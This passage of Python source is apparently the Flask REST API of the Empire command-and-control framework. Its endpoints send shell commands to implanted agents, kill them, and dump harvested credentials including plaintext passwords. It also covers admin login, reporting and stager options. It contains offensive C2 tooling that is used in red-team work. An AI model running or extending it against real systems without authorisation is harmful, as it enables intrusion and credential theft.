            main.agents.add_agent_task_db(agentSessionID, "TASK_SHELL", command)

        return jsonify({'success': True})


    @app.route('/api/agents/<string:agent_name>/rename', methods=['POST'])
    def task_agent_rename(agent_name):
        """
        Renames the specified agent.

        Takes {'newname':'NAME'}
        """

        agentNameID = execute_db_query(conn, 'SELECT name,session_id FROM agents WHERE name like ? OR session_id like ?', [agent_name, agent_name])

        if not agentNameID or len(agentNameID) == 0:
            return make_response(jsonify({'error': 'agent name %s not found' %(agent_name)}), 404)

        (agentName, agentSessionID) = agentNameID[0]
        newName = request.json['newname']

        try:
            result = main.agents.rename_agent(agentName, newName)

            if not result:
                return make_response(jsonify({'error': 'error in renaming %s to %s, new name may have already been used' %(agentName, newName)}), 400)

            return jsonify({'success': True})

        except Exception:
            return make_response(jsonify({'error': 'error in renaming %s to %s' %(agentName, newName)}), 400)


    @app.route('/api/agents/<string:agent_name>/clear', methods=['POST', 'GET'])
    def task_agent_clear(agent_name):
        """
        Clears the tasking buffer for the specified agent.
        """
        if agent_name.lower() == "all":
            # enumerate all target agent sessionIDs
            agentNameIDs = execute_db_query(conn, "SELECT name,session_id FROM agents WHERE name like '%' OR session_id like '%'")
        else:
            agentNameIDs = execute_db_query(conn, 'SELECT name,session_id FROM agents WHERE name like ? OR session_id like ?', [agent_name, agent_name])

        if not agentNameIDs or len(agentNameIDs) == 0:
            return make_response(jsonify({'error': 'agent name %s not found' %(agent_name)}), 404)

        for agentNameID in agentNameIDs:
            (agentName, agentSessionID) = agentNameID

            main.agents.clear_agent_tasks_db(agentSessionID)

        return jsonify({'success': True})


    @app.route('/api/agents/<string:agent_name>/kill', methods=['POST', 'GET'])
    def task_agent_kill(agent_name):
        """
        Tasks the specified agent to exit.
        """
        if agent_name.lower() == "all":
            # enumerate all target agent sessionIDs
            agentNameIDs = execute_db_query(conn, "SELECT name,session_id FROM agents WHERE name like '%' OR session_id like '%'")
        else:
            agentNameIDs = execute_db_query(conn, 'SELECT name,session_id FROM agents WHERE name like ? OR session_id like ?', [agent_name, agent_name])

        if not agentNameIDs or len(agentNameIDs) == 0:
            return make_response(jsonify({'error': 'agent name %s not found' %(agent_name)}), 404)

        for agentNameID in agentNameIDs:
            (agentName, agentSessionID) = agentNameID

            # task the agent to exit
            msg = "tasked agent %s to exit" %(agentSessionID)
            main.agents.save_agent_log(sessionID, msg)
            main.agents.add_agent_task_db(agentSessionID, 'TASK_EXIT')

        return jsonify({'success': True})


    @app.route('/api/creds', methods=['GET'])
    def get_creds():
        """
        Returns JSON describing the credentials stored in the backend database.
        """
        credsRaw = execute_db_query(conn, 'SELECT ID, credtype, domain, username, password, host, os, sid, notes FROM credentials')
        creds = []

        for credRaw in credsRaw:
            [ID, credtype, domain, username, password, host, os, sid, notes] = credRaw
            creds.append({"ID":ID, "credtype":credtype, "domain":domain, "username":username, "password":password, "host":host, "os":os, "sid":sid, "notes":notes})

        return jsonify({'creds' : creds})


    @app.route('/api/reporting', methods=['GET'])
    def get_reporting():
        """
        Returns JSON describing the reporting events from the backend database.
        """
        reportingRaw = execute_db_query(conn, 'SELECT ID, name, event_type, message, time_stamp, taskID FROM reporting')
        reportingEvents = []

        for reportingEvent in reportingRaw:
            [ID, name, event_type, message, time_stamp, taskID] = reportingEvent
            reportingEvents.append({"ID":ID, "agentname":name, "event_type":event_type, "message":message, "timestamp":time_stamp, "taskID":taskID})

        return jsonify({'reporting' : reportingEvents})


    @app.route('/api/reporting/agent/<string:reporting_agent>', methods=['GET'])
    def get_reporting_agent(reporting_agent):
        """
        Returns JSON describing the reporting events from the backend database for
        the agent specified by reporting_agent.
        """

        # first resolve the supplied name to a sessionID
        results = execute_db_query(conn, 'SELECT session_id FROM agents WHERE name=?', [reporting_agent])
        if results:
            sessionID = results[0][0]
        else:
            return jsonify({'reporting' : ''})

        reportingRaw = execute_db_query(conn, 'SELECT ID, name, event_type, message, time_stamp, taskID FROM reporting WHERE name=?', [sessionID])
        reportingEvents = []

        for reportingEvent in reportingRaw:
            [ID, name, event_type, message, time_stamp, taskID] = reportingEvent
            reportingEvents.append({"ID":ID, "agentname":name, "event_type":event_type, "message":message, "timestamp":time_stamp, "taskID":taskID})

        return jsonify({'reporting' : reportingEvents})


    @app.route('/api/reporting/type/<string:event_type>', methods=['GET'])
    def get_reporting_type(event_type):
        """
        Returns JSON describing the reporting events from the backend database for
        the event type specified by event_type.
        """
        reportingRaw = execute_db_query(conn, 'SELECT ID, name, event_type, message, time_stamp, taskID FROM reporting WHERE event_type=?', [event_type])
        reportingEvents = []

        for reportingEvent in reportingRaw:
            [ID, name, event_type, message, time_stamp, taskID] = reportingEvent
            reportingEvents.append({"ID":ID, "agentname":name, "event_type":event_type, "message":message, "timestamp":time_stamp, "taskID":taskID})

        return jsonify({'reporting' : reportingEvents})


    @app.route('/api/reporting/msg/<string:msg>', methods=['GET'])
    def get_reporting_msg(msg):
        """
        Returns JSON describing the reporting events from the backend database for
        the any messages with *msg* specified by msg.
        """
        reportingRaw = execute_db_query(conn, "SELECT ID, name, event_type, message, time_stamp, taskID FROM reporting WHERE message like ?", ['%'+msg+'%'])
        reportingEvents = []

        for reportingEvent in reportingRaw:
            [ID, name, event_type, message, time_stamp, taskID] = reportingEvent
            reportingEvents.append({"ID":ID, "agentname":name, "event_type":event_type, "message":message, "timestamp":time_stamp, "taskID":taskID})

        return jsonify({'reporting' : reportingEvents})


    @app.route('/api/admin/login', methods=['POST'])
    def server_login():
        """
        Takes a supplied username and password and returns the current API token
        if authentication is accepted.
        """

        if not request.json or not 'username' in request.json or not 'password' in request.json:
            abort(400)

        suppliedUsername = request.json['username']
        suppliedPassword = request.json['password']

        # try to prevent some basic bruting
        time.sleep(2)

        if suppliedUsername == username[0] and suppliedPassword == password[0]:
            return jsonify({'token': apiToken})
        else:
            return make_response('', 401)


    @app.route('/api/admin/permanenttoken', methods=['GET'])
    def get_server_perm_token():
        """
        Returns the 'permanent' API token for the server.
        """
        permanentToken = get_permanent_token(conn)
        return jsonify({'token': permanentToken})


    @app.route('/api/admin/restart', methods=['GET', 'POST', 'PUT'])
    def signal_server_restart():
        """
        Signal a restart for the Flask server and any Empire instance.
        """
        restart_server()
        return jsonify({'success': True})


    @app.route('/api/admin/shutdown', methods=['GET', 'POST', 'PUT'])
    def signal_server_shutdown():
        """
        Signal a restart for the Flask server and any Empire instance.
        """
        shutdown_server()
        return jsonify({'success': True})


    if not os.path.exists('./data/empire.pem'):
        print "[!] Error: cannot find certificate ./data/empire.pem"
        sys.exit()


    def shutdown_server():
        """
        Shut down the Flask server and any Empire instance gracefully.
        """
        global serverExitCommand

        if suppress:
            # repair stdout
            sys.stdout.close()
            sys.stdout = oldStdout

        print "\n * Shutting down Empire RESTful API"

        if conn:
            conn.close()

        if suppress:
            print " * Shutting down the Empire instance"
            main.shutdown()

        serverExitCommand = 'shutdown'

        func = request.environ.get('werkzeug.server.shutdown')
        if func is not None:
            func()


    def restart_server():
        """
        Restart the Flask server and any Empire instance.
        """
        global serverExitCommand

        shutdown_server()

        serverExitCommand = 'restart'


    def signal_handler(signal, frame):
        """
        Overrides the keyboardinterrupt signal handler so we can gracefully shut everything down.
        """

        global serverExitCommand

        with app.test_request_context():
            shutdown_server()

        serverExitCommand = 'shutdown'

        # repair the original signal handler
        import signal
        signal.signal(signal.SIGINT, signal.default_int_handler)
        sys.exit()

    try:
        signal.signal(signal.SIGINT, signal_handler)
    except ValueError:
        pass

    # wrap the Flask connection in SSL and start it
    context = ('./data/empire.pem', './data/empire.pem')
    app.run(host='0.0.0.0', port=int(port), ssl_context=context, threaded=True)


if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    generalGroup = parser.add_argument_group('General Options')
    generalGroup.add_argument('--debug', nargs='?', const='1', help='Debug level for output (default of 1, 2 for msg display).')
    generalGroup.add_argument('-v', '--version', action='store_true', help='Display current Empire version.')

    cliGroup = parser.add_argument_group('CLI Payload Options')
    cliGroup.add_argument('-l', '--listener', nargs='?', const="list", help='Display listener options. Displays all listeners if nothing is specified.')
    cliGroup.add_argument('-s', '--stager', nargs='?', const="list", help='Specify a stager to generate. Lists all stagers if none is specified.')
    cliGroup.add_argument('-o', '--stager-options', nargs='*', help="Supply options to set for a stager in OPTION=VALUE format. Lists options if nothing is specified.")

    restGroup = parser.add_argument_group('RESTful API Options')
    launchGroup = restGroup.add_mutually_exclusive_group()
    launchGroup.add_argument('--rest', action='store_true', help='Run Empire and the RESTful API.')
    launchGroup.add_argument('--headless', action='store_true', help='Run Empire and the RESTful API headless without the usual interface.')
    restGroup.add_argument('--restport', type=int, nargs=1, help='Port to run the Empire RESTful API on.')
    restGroup.add_argument('--username', nargs=1, help='Start the RESTful API with the specified username instead of pulling from empire.db')
    restGroup.add_argument('--password', nargs=1, help='Start the RESTful API with the specified password instead of pulling from empire.db')

    args = parser.parse_args()

    if not args.restport:
        args.restport = '1337'
    else:
        args.restport = args.restport[0]

    if args.version:
        print empire.VERSION

    elif args.rest:
        # start an Empire instance and RESTful API
        main = empire.MainMenu(args=args)
        def thread_api(empireMenu):
            while serverExitCommand == 'restart':
                try:
                    start_restful_api(empireMenu=empireMenu, suppress=False, username=args.username, password=args.password, port=args.restport)
                except SystemExit as e:
                    pass

        thread = helpers.KThread(target=thread_api, args=(main,))
        thread.daemon = True
        thread.start()
        sleep(2)
        main.cmdloop()

    elif args.headless:
        # start an Empire instance and RESTful API and suppress output
        main = empire.MainMenu(args=args)
        while serverExitCommand == 'restart':
            try:
                start_restful_api(empireMenu=main, suppress=True, username=args.username, password=args.password, port=args.restport)
            except SystemExit as e:
                pass

    else:
        # normal execution
        main = empire.MainMenu(args=args)
        main.cmdloop()

    sys.exit()
